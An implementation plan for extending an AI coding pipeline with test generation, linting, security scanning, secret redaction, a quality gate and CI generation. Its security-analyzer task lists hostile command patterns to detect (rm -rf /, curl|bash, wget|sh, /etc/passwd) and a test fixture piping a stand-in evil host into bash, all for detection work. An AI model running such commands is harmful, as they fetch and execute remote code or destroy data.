# Engineer AI Subsystem Completion - Implementation Plan

## Task 1: Extend LangGraph AgentState with New Fields
- **Status**: `pending`
- **Priority**: high
- **Depends On**: None
- **Description**:
  - Edit [agents/state.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/state.py) to add new TypedDict keys: generated_tests (list), static_analysis_results (dict), security_analysis_results (dict), quality_gate_report (dict), engineer_evaluation (dict), generated_ci_files (list).
  - Ensure all new fields have sensible default types so existing executions load correctly.
  - Verify the file still parses (no syntax errors).
- **Acceptance Criteria Addressed**: AC-11
- **Test Requirements**:
  - `rule` TR-1.1: Importing `AgentState` from agents.state succeeds and `AgentState.__annotations__` contains all 6 new keys.
  - `rule` TR-1.2: Instantiating a dict with one value per key (including new fields) does not raise TypeError under TypedDict structural typing.

## Task 2: Implement Test Generator Agent
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Task 1
- **Description**:
  - Create [agents/test_generator.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/test_generator.py) exporting `test_generator_agent(state)`.
  - Detect project stack (Python/Node) from workspace_manager.list_files + package.json/requirements.txt.
  - Call generate_response with a prompt containing the generated source files (from generated_code) and ask for tests.
  - Extract generated tests in canonical list format using existing parsers.
  - Store tests in state["generated_tests"], write them to the workspace via workspace_manager.write_files, and merge into generated_code/fixed_code so the files persist.
  - Call UsageTracker.set_context, append_execution_step for start/complete/fail.
- **Acceptance Criteria Addressed**: AC-1, AC-11
- **Test Requirements**:
  - `rule` TR-2.1: For a Python project with src/main.py, test_generator_agent produces at least one tests/test_*.py file in generated_tests and the workspace directory listing shows it.
  - `rule` TR-2.2: For a JS project with src/App.jsx, test_generator_agent produces at least one src/__tests__/App.test.jsx or src/App.test.js in generated_tests.
  - `rule` TR-2.3: An execution_steps entry with agent=test_generator, step=generation, and status=completed is appended.

## Task 3: Enhance Tester Agent with Real Test Execution + Coverage
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Task 2
- **Description**:
  - Edit [agents/tester.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/tester.py) `_build_test_plan` to add pytest/Jest/Vitest suite commands when test files exist in the workspace.
  - For Python (when pytest.ini or tests/ exists): run `.aethera-venv/bin/python -m pip install pytest pytest-cov` (if needed via sandbox) then `.aethera-venv/bin/python -m pytest --cov=src --cov-report=json --tb=short` or equivalent.
  - For JS/TS (package.json with jest/vitest test script): run `npm test -- --coverage --json` (for Jest) or `npx vitest run --reporter=json --coverage` (for Vitest).
  - Parse coverage JSON outputs into structured `test_results.coverage` with line/branch/statement/function percentages.
  - Parse suite output to per-suite entries with duration, status, stdout/stderr snippets.
  - Never hardcode "PASS" when command exit code is nonzero.
  - Append execution_steps for each test suite run.
- **Acceptance Criteria Addressed**: AC-2
- **Test Requirements**:
  - `rule` TR-3.1: When pytest command exits 0 with coverage JSON present, test_results.coverage.line_pct equals the coverage report value (not a fabricated number).
  - `rule` TR-3.2: When jest command exits nonzero, test_results.status == "FAIL" and failed_commands includes that test suite.
  - `rubric` TR-3.3: Coverage data fidelity; scale 1-5; anchors: 1=coverage always null, 3=some coverage present but fields missing, 5=all four coverage percentages present and match stdout report; threshold >= 3; evidence = comparison of captured coverage.json values vs stored values.

## Task 4: Implement Static Analysis Agent
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Task 1
- **Description**:
  - Create [agents/static_analyzer.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/static_analyzer.py) exporting `static_analyzer_agent(state)`.
  - Detect Ruff / pyproject.toml with [tool.ruff] for Python; run `ruff check --output-format json` in the sandbox via WorkspaceManager; if not installed, install as one-shot `pip install ruff` in the venv first.
  - Detect mypy via mypy.ini / pyproject [tool.mypy]; run `mypy --output-format json`.
  - Detect ESLint via .eslintrc/eslintConfig; run `npx eslint --format json ...`.
  - Detect TypeScript via tsconfig.json; run `npx tsc --noEmit` (parse stdout/stderr for file/line/message).
  - Normalize all findings into a common schema: {severity: CRITICAL|HIGH|MEDIUM|LOW, category: LINT|TYPECHECK, rule_id, file, line, message}.
  - Store in state["static_analysis_results"], append to execution_steps with counts per severity, and include raw analyzer stdout snippets.
- **Acceptance Criteria Addressed**: AC-3, AC-5
- **Test Requirements**:
  - `rule` TR-4.1: When ESLint JSON output contains 2 errors, static_analysis_results.errors contains exactly 2 entries with matching rule_id and file.
  - `rule` TR-4.2: When ruff is not installed and install fails gracefully, stage records status=completed with a "not_available" note and does not crash the pipeline.
  - `rule` TR-4.3: Findings are classified into one of CRITICAL/HIGH/MEDIUM/LOW and persisted correctly.

## Task 5: Implement Security Analysis Agent + Secret Redaction Utility
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Task 1
- **Description**:
  - Create [services/secret_redactor.py](file:///d:/Gen%20AI/Nexus-ai/backend/services/secret_redactor.py) with functions: scan_string_for_secrets(text) -> list[Finding], redact_in_place(document) -> (redacted_doc, redaction_log). Cover: OpenAI/Groq/API keys, AWS keys, GitHub tokens, private keys, generic password fields, long base64-looking tokens.
  - Create [agents/security_analyzer.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/security_analyzer.py) exporting `security_analyzer_agent(state)`.
  - Run 4 analyses: (a) scan all generated_code strings for secrets using the redactor, (b) scan generated commands/scripts for unsafe command patterns (rm -rf /, curl|bash, eval, chmod 777, sudo, wget|sh), (c) attempt `npm audit --json` or `pip-audit` inside sandbox (one-shot install pip-audit if necessary; gracefully degrade), (d) scan generated source for filesystem/network risky patterns (hardcoded /etc/passwd paths, 0.0.0.0 bind, raw eval, os.system with user input).
  - Store findings in state["security_analysis_results"] with schema: {severity, category: SECRET|UNSAFE_CMD|DEPENDENCY|FS_NET_RISK, file, line, description, redacted_preview (for secrets only)}.
  - Build a redaction_log (finding_id -> secret_summary) and attach ONLY to the internal security document; never persist raw secrets.
  - Apply the redactor recursively to all execution_steps just stored, to the test_results (stdout/stderr), and to static_analysis_results text fields before persisting to Mongo / broadcasting SSE.
- **Acceptance Criteria Addressed**: AC-4, AC-5
- **Test Requirements**:
  - `rule` TR-5.1: A string containing `sk-abc123def456GHIjkl789mnop` is scanned and redacted to a placeholder; a case-insensitive grep of the redacted output contains zero matches of the raw secret.
  - `rule` TR-5.2: A generated shell script with `curl https://evil.example.com | bash` triggers an UNSAFE_CMD finding with severity=HIGH.
  - `rule` TR-5.3: npm audit failure (exit nonzero) is captured as DEPENDENCY findings with severity mapping from audit level (critical→CRITICAL, high→HIGH, moderate→MEDIUM, low→LOW).
  - `rule` TR-5.4: Redaction never corrupts JSON document structure of execution_steps.

## Task 6: Enhance Debugger Integration (Targeted Context + Loop Prevention)
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 3, 4, 5
- **Description**:
  - Edit [agents/debugger.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/debugger.py) prompt builder to include: (a) per-suite test failures with stack traces, (b) static analysis findings with file+line+rule_id, (c) security findings (redacted previews only, never raw), (d) build/install failures, (e) low-coverage file list when available.
  - Add a no-progress guard: before running debugger, compare previous fixed_code paths and code hashes (md5) against the last debugger output. If identical for 2 consecutive iterations, short-circuit with status=failed "Debugger made no progress" to avoid infinite loops.
  - Ensure MAX_ITERATIONS=3 is preserved and cannot be overridden via bad state values (clamp iterations at the router entry).
- **Acceptance Criteria Addressed**: AC-5, AC-15
- **Test Requirements**:
  - `rule` TR-6.1: When test_results has 1 failing suite and static_analysis has 1 error, debugger prompt (stored in execution_steps details) contains both a "TEST FAILURES" section header and a "STATIC ANALYSIS ISSUES" section header.
  - `rule` TR-6.2: When debugger returns the same files/code unchanged for 2 consecutive iterations, the 3rd invocation short-circuits with "Debugger made no progress" and returns to router without another LLM call.

## Task 7: Implement Quality Gate Agent + Routing
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 3, 4, 5
- **Description**:
  - Create [agents/quality_gate.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/quality_gate.py) exporting `quality_gate_agent(state)`.
  - Implement 6 checks with real evidence:
    1. Build: required build commands succeeded (zero failures).
    2. Tests: test suite all pass when test files exist (zero failed test commands).
    3. Coverage: coverage.line_pct >= env AETHERA_MIN_COVERAGE_PCT or >=60% when coverage is AVAILABLE; if coverage tool was NOT run/available, this check = "not_applicable" (not failed).
    4. Lint/Type: zero CRITICAL static findings; HIGH count <=5.
    5. Security: zero CRITICAL/HIGH severity SECRET and UNSAFE_CMD findings; DEPENDENCY CRITICAL count=0 unless explicitly acknowledged.
    6. Unresolved errors: no "pending" runtime/build errors flagged by tester (check tester's failed_commands empty).
  - Store structured gate_report: {overall: PASS|FAIL, checks: {name: {status, measured, threshold, note}}}.
  - Edit [agents/graph.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/graph.py) add a new route_after_quality_gate(state) function that returns "debugger" when gate FAIL and iterations<MAX_GATE_ITERATIONS (default 2 additional fix loops beyond MAX_ITERATIONS tester cap, but clamped globally), else "end" to proceed to deployer.
  - Edit the graph conditional edges to route tester → quality_gate → deployer/debugger accordingly.
- **Acceptance Criteria Addressed**: AC-6, AC-11
- **Test Requirements**:
  - `rule` TR-7.1: When tests have 1 failed command and 0 coverage, gate_report.overall=FAIL and checks.tests.status=FAIL.
  - `rule` TR-7.2: When all 6 checks PASS or are not_applicable, gate_report.overall=PASS and deployer node runs next.
  - `rule` TR-7.3: Coverage check returns "not_applicable" (not FAIL) when test_results.coverage is null/not_available.

## Task 8: Implement Engineer Evaluation Persistence
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 3, 4, 5, 7
- **Description**:
  - Create [db/engineer_evaluation_service.py](file:///d:/Gen%20AI/Nexus-ai/backend/db/engineer_evaluation_service.py) with save_engineer_evaluation, get_engineer_evaluation_by_execution, list_engineer_evaluations(query) using a new Mongo collection `engineer_evaluations` from [db/mongo_client.py](file:///d:/Gen%20AI/Nexus-ai/backend/db/mongo_client.py) (add collection export there).
  - Create a helper build_engineer_evaluation(state) that aggregates data from all stages and UsageTracker.get_execution_usage, get_budget_status.
  - Call save_engineer_evaluation in generate_project after the pipeline returns.
  - Store the evaluation dict in state["engineer_evaluation"] so it flows to the frontend.
- **Acceptance Criteria Addressed**: AC-7
- **Test Requirements**:
  - `rule` TR-8.1: After a completed engineer execution, find_one on engine_evaluations by execution_id returns a document with all required top-level keys (execution_id, project_id, success, tests, coverage, security, static_analysis, iterations, latencies, tokens, cost, deployment, quality_gate).
  - `rule` TR-8.2: Tokens and cost match UsageTracker.get_execution_usage(execution_id) aggregated values.
  - `rubric` TR-8.3: Completeness of per-agent latency tracking; scale 1-5; anchors 1=no latencies stored, 3=some agents have latencies, 5=planner/coder/test_generator/static/security/tester/debugger/gate/deployer each have duration_ms; threshold >= 4.

## Task 9: Improve Self-Learning (Validation + Wider Injection)
- **Status**: `pending`
- **Priority**: medium
- **Depends On**: Tasks 7, 8
- **Description**:
  - Edit [services/self_learning.py](file:///d:/Gen%20AI/Nexus-ai/backend/services/self_learning.py) record_lessons_from_execution to validate before saving: (a) execution had >=1 debugger iteration OR test_results FAIL followed by PASS; (b) final quality_gate_report.overall == PASS. If validation fails, return early and log "Skipping learning: did not produce validated passing fix".
  - Call record_lessons_from_execution from generate_project at the end when pipeline completes and gate passes.
  - Edit planner_agent, coder_agent, tester_agent to inject get_active_learnings(user_id) context into their prompts (debugger already does).
  - Add a lightweight relevance filter: build keyword sets (words, file extensions) from current idea/generated files vs stored lessons; if no overlap skip injecting.
  - Save list of learnings_applied (by learning_id) to state["agent_notes"] and include in evaluation.
- **Acceptance Criteria Addressed**: AC-8
- **Test Requirements**:
  - `rule` TR-9.1: When execution completes with quality_gate=PASS and iterations>=1, record_lessons creates 1 new document in agent_learnings with enabled=True.
  - `rule` TR-9.2: When execution quality_gate=FAIL (no pass), record_lessons returns early without creating a learning (count stays same).
  - `rule` TR-9.3: Planner agent prompt context contains a "LESSONS LEARNED" header when at least one applicable learning exists.

## Task 10: Complete Git/GitHub Services + FastAPI Routes
- **Status**: `pending`
- **Priority**: medium
- **Depends On**: Task 1
- **Description**:
  - Create [services/git_service.py](file:///d:/Gen%20AI/Nexus-ai/backend/services/git_service.py) implementing detect_git_repo, git_init, git_branch, git_status, git_diff, git_commit, git_pull, git_import_from_github using subprocess patterns (similar to existing github_service push logic), stripping tokens from URLs/commands before logging, never storing tokens in execution_steps.
  - Edit [services/github_service.py](file:///d:/Gen%20AI/Nexus-ai/backend/services/github_service.py) push_project_to_github to mask tokens from any string being appended to execution_steps or logs using the secret_redactor service.
  - Extend [api/routes/github.py](file:///d:/Gen%20AI/Nexus-ai/backend/api/routes/github.py) with new endpoints: detect, init, branch, status, diff, commit, pull, import, under appropriate paths with RBAC (owner only for writes).
  - In [main.py](file:///d:/Gen%20AI/Nexus-ai/backend/main.py) ensure routes are mounted.
- **Acceptance Criteria Addressed**: AC-9, AC-12
- **Test Requirements**:
  - `rule` TR-10.1: Calling git_init on a new workspace folder results in .git directory existing, git_status reports clean status.
  - `rule` TR-10.2: git_import_from_github with a URL containing a token has that token redacted from execution_steps (grep returns zero matches).
  - `rule` TR-10.3: Non-owner user calling git_commit receives HTTP 403, not 500.

## Task 11: Implement CI/CD Workflow Generator
- **Status**: `pending`
- **Priority**: medium
- **Depends On**: Task 7
- **Description**:
  - Create [services/ci_cd_generator.py](file:///d:/Gen%20AI/Nexus-ai/backend/services/ci_cd_generator.py) with generate_ci_workflow(project_stack, workspace_files) -> {path: ".github/workflows/ci.yml", code: "yaml string"}.
  - For Node projects: workflow includes jobs: install (setup-node, npm ci, cache), lint (npm run lint if script present), typecheck (tsc --noEmit when tsconfig exists), test (npm test -- --coverage with artifact upload), build (npm run build if script present).
  - For Python projects: jobs: install (setup-python, venv + pip install -r requirements.txt, cache pip), lint (ruff check when config present), typecheck (mypy when mypy.ini present), test (pytest --cov with artifact upload), build if setup.py/pyproject build config.
  - Set permissions: contents: read at the workflow level. No deploy job.
  - Integrate into deployer_agent: if QualityGate passes and file does not exist, call generator and add CI file to generated_ci_files list + generated_code/fixed_code + workspace.
  - Append execution_steps entry ci_cd_generated: status=completed with path.
- **Acceptance Criteria Addressed**: AC-10
- **Test Requirements**:
  - `rule` TR-11.1: Generated Node workflow yml has jobs order in file: install → lint → typecheck → test → build (yaml sibling ordering via depends_on or appearance before subsequent needs references).
  - `rule` TR-11.2: permissions: contents: read appears at top level of workflow yaml.
  - `rule` TR-11.3: No string "deploy" in job names or "needs: [deploy]": deploy jobs absent.

## Task 12: Wire New Nodes into LangGraph Graph
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 2, 4, 5, 7
- **Description**:
  - Edit [agents/graph.py](file:///d:/Gen%20AI/Nexus-ai/backend/agents/graph.py):
    - Import new agents: test_generator_agent, static_analyzer_agent, security_analyzer_agent, quality_gate_agent.
    - Create traced + log_agent_run wrappers for each new node (traced_test_generator_agent, etc.) using the same pattern as existing nodes.
    - Add each node to the workflow: workflow.add_node(...)
    - Rewire edges to form the DAG: planner → coder → test_generator → static_analyzer → security_analyzer → tester → conditional (FAIL→debugger) → quality_gate → conditional (FAIL→debugger, PASS→deployer) → END.
    - Update REPLAY_NODES dict to include all new nodes with canonical names + aliases.
    - Update route_after_quality_gate to use new edges mapping.
- **Acceptance Criteria Addressed**: AC-11, AC-6
- **Test Requirements**:
  - `rule` TR-12.1: `graph.get_graph().nodes` (or equivalent workflow inspection) contains 9 nodes: planner, coder, test_generator, static_analyzer, security_analyzer, tester, debugger, quality_gate, deployer.
  - `rule` TR-12.2: Replay for step "static_analyzer" alias "lint" works via replay_agent_step and does not raise ValueError.
  - `rule` TR-12.3: Each new node wrapped by _run_observed_agent enforces UsageTracker.enforce_budget (verified via budget enforcement call happening before LLM call — verify via logic or test).

## Task 13: Add New FastAPI Routes (Evaluations + Git Completeness)
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 8, 10
- **Description**:
  - Create new [api/routes/engineer_evaluations.py](file:///d:/Gen%20AI/Nexus-ai/backend/api/routes/engineer_evaluations.py) with:
    - GET /ai/engineer-evaluations/{execution_id} -> returns evaluation doc
    - GET /ai/engineer-evaluations?project_id=&user_id= -> lists matching evaluations
  - Mount in main.py.
  - Ensure all existing routes in api/routes/execution.py remain working with new state fields; when hydrating replays include generated_tests, generated_ci_files, security/static/evaluation fields.
  - Add SSE publishing for new stages' execution_steps if any custom publishing exists; verify that append_execution_step already covers the pipeline.
- **Acceptance Criteria Addressed**: AC-7, AC-12
- **Test Requirements**:
  - `rule` TR-13.1: GET /ai/engineer-evaluations/{exec_id} returns 200 with evaluation document for a completed run.
  - `rule` TR-13.2: GET /ai/engineer-evaluations?user_id=<x> returns evaluations only for user x (verify that the Mongo query filter applied correctly).

## Task 14: Frontend EngineerPanel Audit + Fixes
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 2, 3, 4, 5, 7, 8, 11
- **Description**:
  - Audit [EngineerPanel.jsx](file:///d:/Gen%20AI/Nexus-ai/frontend/src/components/EngineerPanel.jsx):
    - Add tabs/sections for Tests (list suites with pass/fail/duration, expand stdout/stderr), Coverage (metric badges + per-file breakdown), Lint/Type (findings table with severity chips + rule id + link to file/line), Security (findings table with severity chips + redacted previews ONLY — never render the raw redacted content), Quality Gate Report (checks table with measured vs threshold), Evaluation (tokens/cost/latencies/iterations cards), CI/CD file (show .github/workflows/ci.yml in FileViewer), Git actions (init, status, commit, push).
    - Ensure normalizeFiles covers generated_tests and generated_ci_files when rendering the file list.
    - Ensure budget status (from UsageTracker API) is rendered as warning/error banner when approaching/exceeding.
    - Ensure all sections degrade gracefully when data is missing (empty states, not crashes).
  - Fix any broken imports or missing state fields.
- **Acceptance Criteria Addressed**: AC-13, AC-14, AC-15
- **Test Requirements**:
  - `rule` TR-14.1: When result.test_results contains 2 test suites, EngineerPanel renders a DOM section with data-testid (or analogous marker) showing suite count = 2 and pass_count correct.
  - `rule` TR-14.2: When result.security_analysis contains 1 secret finding, DOM never contains the raw secret token even if somehow present upstream (redaction already happens server-side; verify via a check that the redactor utility pattern is respected or that the finding preview field is rendered only).
  - `rule` TR-14.3: npm run build completes without TS/JSX errors after changes.

## Task 15: Frontend EngineerChat Audit + Fixes
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Task 14
- **Description**:
  - Audit [EngineerChat.jsx](file:///d:/Gen%20AI/Nexus-ai/frontend/src/components/workspace/EngineerChat.jsx):
    - Wire Cancel button to POST /ai/executions/{id}/cancel and reflect cancelled state in UI (disable prompt, show status badge CANCELLED).
    - Ensure Automatic (Supervisor) mode and Manual mode both work (existing routing should be intact; verify by checking workspace_mode handling).
    - Ensure Replay step action and Restore + Diff actions navigate correctly and update result state.
    - Ensure SSE stream types for all new stages are handled (already generic step handler, so verify by confirming test_generator/static_analyzer/security_analyzer/quality_gate/ci_cd_generated steps appear in AgentLiveTimeline).
    - Verify API payload for POST /continue-project matches backend schema (project_id/execution_id + workspace_mode).
  - Fix any UI/state bugs found.
- **Acceptance Criteria Addressed**: AC-13, AC-14, AC-15
- **Test Requirements**:
  - `rule` TR-15.1: Clicking Cancel button triggers POST to /cancel endpoint and UI status changes to Cancelled (verify via mock or server round trip).
  - `rule` TR-15.2: Replay step creates new execution via the endpoint and begins streaming new steps for the child execution_id.
  - `rule` TR-15.3: Manual mode direct execution and Automatic (Supervisor) routing both produce a complete Engineer result when given the same prompt (at minimum the same stage steps are emitted).

## Task 16: Backend Unit Test Coverage for New Modules
- **Status**: `pending`
- **Priority**: medium
- **Depends On**: Tasks 1-13
- **Description**:
  - Under [backend/tests/](file:///d:/Gen%20AI/Nexus-ai/backend/tests/) add test files:
    - test_secret_redactor.py: scan redaction, corrupts nothing, patterns matched.
    - test_static_analyzer.py: parse Ruff/ESLint output schemas.
    - test_security_analyzer.py: unsafe command detection.
    - test_quality_gate.py: 6 checks pass/fail/not_applied scenarios.
    - test_engineer_evaluation_service.py: save/get/list evaluations.
    - test_git_service.py: mock subprocess outputs for init/status/commit/branch/diff/pull.
    - test_ci_cd_generator.py: yaml job ordering for Node/Python, no deploy jobs, permission contents: read.
  - Ensure each runs against existing pytest config (backend tests dir).
- **Acceptance Criteria Addressed**: AC-15
- **Test Requirements**:
  - `rule` TR-16.1: Running `cd backend && python -m pytest tests/ -q` passes all new tests with 0 failures.
  - `rule` TR-16.2: New test files import cleanly with no circular dependencies.

## Task 17: Frontend Tests + Build + Type Checks
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 14, 15
- **Description**:
  - Run backend tests via pytest.
  - Run frontend `npm install`, `npm run build`, and any configured `npm run lint` / type check commands (since this is Vite/JS not TS, at minimum build succeeds; if eslint config present, run eslint and fix any new code lint issues).
  - Fix any build/lint errors introduced by frontend changes.
- **Acceptance Criteria Addressed**: AC-15
- **Test Requirements**:
  - `rule` TR-17.1: `cd frontend && npm run build` returns exit 0 with no errors.
  - `rule` TR-17.2: `cd frontend && npx eslint src --max-warnings 50` (if eslint config exists) returns exit 0 for Engineer UI files.
  - `rubric` TR-17.3: Frontend UI responsiveness; scale 1-5; anchors: 1=white screen on Engineer route, 3=basic load works but some tabs empty, 5=all sections render with proper empty and loading states; threshold >= 4.

## Task 18: Mandatory 15-Point Final Audit + Scenario Runs
- **Status**: `pending`
- **Priority**: high
- **Depends On**: Tasks 1-17
- **Description**:
  - Perform the 15-point audit list from user spec and record evidence:
    1. Every Engineer agent (planner/coder/test_generator/static_analyzer/security_analyzer/tester/debugger/quality_gate/deployer) verifies by code walkthrough + runtime step entry in execution_steps.
    2. LangGraph transitions: verify edge order matches spec via graph structure dump + execution_steps order in at least 1 run.
    3. FastAPI routes: start backend, hit each route with curl/requests, verify 200 or expected 4xx, no 500s in normal paths.
    4. Mongo persistence: ensure executions collection (with new fields), project_versions, engineer_evaluations, agent_learnings each get documents written in a complete run.
    5. Redis queue/worker: submit an engineer.generate job via enqueue_job with Redis up (or verify direct fallback when Redis down), ensure worker consumes it and writes status.
    6. Docker sandbox: verify test/lint/typecheck/security commands' execution_results.sandboxed = True and sandbox.image matches detected project stack.
    7. SSE: subscribe to stream during an execution, capture at least one event per new stage type (test_generator, static_analyzer, security_analyzer, quality_gate, ci_cd_generated).
    8. Cancellation: POST cancel mid-execution; verify status=cancelled in DB + failed SSE event emitted; pipeline stops progressing.
    9. RBAC: non-owner POST to git_commit → 403; owner → 200.
    10. Budgets/UsageTracker: set artificially low budget (via env override), trigger LLM calls → ensure BudgetExceededError raised and persisted in evaluation.
    11. Replay/restore/diff: run replay for step "debugger", restore version 1, request diff between exec_ids; all return 200 and correct semantics.
    12. Frontend/backend contracts: hit main endpoints from frontend api.js/service and check response schemas match shapes consumed by UI.
    13. Backend tests: pytest run — exit 0.
    14. Frontend: build/typecheck — exit 0 each.
    15. Complete end-to-end scenario runs:
        - (a) Successful simple FastAPI HTML project → gate PASS, deployer runs.
        - (b) Generate project with intentionally failing test → debugger runs, retest passes (or if unable to fix within iterations, gate FAIL).
        - (c) Cancellation mid-pipeline.
        - (d) Replay step + Restore version + Diff between two executions.
  - Fix every discovered issue (do not just report); create follow-up sub-tasks if needed and attach evidence.
- **Acceptance Criteria Addressed**: AC-1 through AC-15
- **Test Requirements**:
  - `rule` TR-18.1: 15-point audit checklist has each item marked with either PASS evidence (command output, file path, log) or FIXED evidence (before/after for each issue remediated).
  - `rule` TR-18.2: At least 4 scenario runs ((a)-(d)) each produce an execution document with status either completed/cancelled and the expected quality_gate or cancellation outcome.
  - `rubric` TR-18.3: Overall audit fidelity; scale 1-5; anchors: 1=many unverified claims, 3=some runs done but logs thin, 5=each audit point has a concrete command output; threshold >= 4.
